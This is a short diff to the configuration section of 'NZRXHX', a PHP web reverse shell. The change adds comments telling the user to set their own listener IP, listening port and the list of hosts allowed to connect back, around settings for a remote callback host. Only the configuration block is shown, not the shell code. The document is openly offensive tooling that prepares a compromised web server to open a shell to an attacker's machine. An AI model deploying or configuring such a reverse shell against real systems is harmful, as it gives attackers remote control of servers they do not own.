@@ -2,9 +2,9 @@
 // ============== NZRXHX =============
 // NZRXHX PHP based web reverse shell
 // ========== CONFIGURATION ==========
-$allowed_hosts = ['192.168.1.1'];
-$remote_host   = '192.168.1.1';
-$remote_port   = 443;
+$allowed_hosts = ['192.168.1.1']; //Change this (takes a list of IPs if multiple devices will open a reverse shell)
+$remote_host   = '192.168.1.1'; //Change this to your listener IP
+$remote_port   = 443; //Change this to your listening port
 $timeout       = 10;
 
 // ========== SANITY CHECK ==========
